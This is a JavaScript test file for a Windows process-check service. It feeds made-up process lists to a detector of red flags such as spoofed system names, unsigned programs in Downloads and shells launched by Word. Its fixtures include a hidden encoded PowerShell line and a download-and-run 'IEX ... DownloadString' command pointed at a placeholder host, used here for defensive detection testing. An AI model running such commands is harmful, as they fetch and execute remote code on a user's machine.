// The process check's red-flag rules, on made-up process lists.
import assert from "node:assert/strict";
import { describe, test } from "node:test";
import { analyzeProcesses } from "../server/services/processCheckService.js";

const proc = (pid, name, path = null, extra = {}) => ({ pid, ppid: 4, name, path, signature: "", commandLine: "", ...extra });

const normalPc = [
  proc(4, "System"),
  proc(700, "svchost.exe", "C:\\Windows\\System32\\svchost.exe"),
  proc(701, "svchost.exe", "C:\\Windows\\System32\\svchost.exe"),
  proc(702, "lsass.exe"), // path hidden without admin rights
  proc(703, "dasHost.exe"), // real Windows process, two letters off dllhost.exe
  proc(704, "explorer.exe", "C:\\Windows\\explorer.exe"),
  proc(705, "Code.exe", "C:\\Users\\alex\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe", { signature: "Valid|Microsoft Corporation" }),
  proc(706, "Spotify.exe", "C:\\Users\\alex\\AppData\\Roaming\\Spotify\\Spotify.exe", { signature: "Valid|Spotify AB" }),
  proc(707, "powershell.exe", "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", { commandLine: "powershell.exe -NoProfile -Command Get-Date" })
];

describe("process check", () => {
  test("a normal PC has no findings", () => {
    assert.deepEqual(analyzeProcesses(normalPc), []);
  });

  test("a system process name outside Windows is high", () => {
    const [finding] = analyzeProcesses([...normalPc, proc(900, "svchost.exe", "C:\\Users\\alex\\AppData\\Roaming\\svchost.exe")]);
    assert.equal(finding.severity, "high");
    assert.equal(finding.pid, 900);
  });

  test("a look-alike name is high", () => {
    const [finding] = analyzeProcesses([...normalPc, proc(901, "scvhost.exe", "C:\\ProgramData\\scvhost.exe")]);
    assert.equal(finding.severity, "high");
    assert.match(finding.reason, /svchost\.exe/);
  });

  test("encoded and download-and-run PowerShell are high", () => {
    const encoded = analyzeProcesses([proc(902, "powershell.exe", "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", { commandLine: `powershell -w hidden -enc ${"A".repeat(200)}` })]);
    assert.equal(encoded[0].severity, "high");
    // Long base64 is shortened in the report.
    assert.ok(encoded[0].commandLine.length < 120);
    const download = analyzeProcesses([proc(903, "powershell.exe", null, { commandLine: "powershell IEX (New-Object Net.WebClient).DownloadString('http://x/y')" })]);
    assert.equal(download[0].severity, "high");
  });

  test("unsigned programs in Temp or Downloads are medium; signed ones low", () => {
    const findings = analyzeProcesses([
      proc(904, "setup.exe", "C:\\Users\\alex\\Downloads\\setup.exe", { signature: "NotSigned|" }),
      proc(905, "helper.exe", "C:\\Users\\alex\\AppData\\Local\\Temp\\x\\helper.exe", { signature: "Valid|Some Vendor" })
    ]);
    assert.deepEqual(findings.map((f) => [f.pid, f.severity]), [[904, "medium"], [905, "low"]]);
  });

  test("a shell started by Word is medium", () => {
    const findings = analyzeProcesses([proc(800, "WINWORD.EXE"), proc(906, "cmd.exe", "C:\\Windows\\System32\\cmd.exe", { ppid: 800 })]);
    assert.equal(findings[0].severity, "medium");
    assert.match(findings[0].reason, /WINWORD/);
  });

  test("many copies of one program are reported once", () => {
    const copies = [1, 2, 3].map((n) => proc(1000 + n, "miner.exe", "C:\\Users\\Public\\miner.exe", { signature: "NotSigned|" }));
    assert.equal(analyzeProcesses(copies).length, 1);
  });
});
